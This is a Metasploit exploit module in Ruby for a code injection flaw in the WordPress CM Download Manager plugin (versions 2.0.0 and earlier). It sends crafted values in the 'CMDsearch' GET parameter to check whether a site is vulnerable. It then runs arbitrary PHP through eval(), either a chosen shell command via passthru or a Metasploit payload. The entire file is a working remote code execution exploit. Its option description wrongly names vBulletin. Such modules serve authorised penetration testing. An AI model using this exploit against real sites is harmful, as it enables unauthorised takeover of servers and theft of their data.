##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress CM Download Manager Plugin Code Injection',
      'Description'    => %q{
        This module exploits a vulnerability in the alterSearchQuery() function
        defined in /wp-content/plugins/cm-download-manager/lib/controllers
        /CmdownloadController.php for Wordpress CM Download Manager plugin
        versions 2.0.0 and earlier. User input passed through 'CMDsearch'
        GET parameter isn't properly sanitized before being used in a call
        to preg_match_all().  This can be exploited to inject and execute
        arbitrary code leveraging the PHP's complex curly syntax.
      },
      'Author'         => 'Nixawk', # originally reported by the (Phi Ngoc Le)
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '35324']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Automatic', {}]],
      'DisclosureDate' => 'Sep 9 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new(
          'URI', [true, 'The full URI path to vBulletin', '/cmdownloads/']
        ),
        OptString.new('CMD', [false, 'Command to execute'])
      ], self.class)
  end

  def check
    flag = rand_text_alpha(rand(10) + 10)
    print_status("generate a flag: #{flag}")

    payload = "\".print(#{flag}).\""

    uri = normalize_uri(datastore['URI'])

    response = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'vars_get'  => { 'CMDsearch' => "#{payload}" }
    })

    if response.code == 200 && response.body =~ /#{flag}/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    command = datastore['CMD']
    if command
      p = "passthru(\"#{command}\")"
    else
      p = payload.encoded
    end

    uri = normalize_uri(datastore['URI'])
    print_status("#{peer} - Uploading payload")

    response = send_request_cgi({
      'method'    =>  'GET',
      'uri'       =>  uri,
      'vars_get'  =>  { 'CMDsearch' => "\".eval(#{p}).\"" }
    })

    if (response.code == 200)
      print_status("The server returned: #{response.code} #{response.message}")
      parts = response.body.match(/<div class=\"main\">(.*)<form /mi)
      if parts
        print_status(parts[1].to_s) # If a blank line, php sec may be enable
      end
    else
      print_status('No response from the server')
    end
  end
end
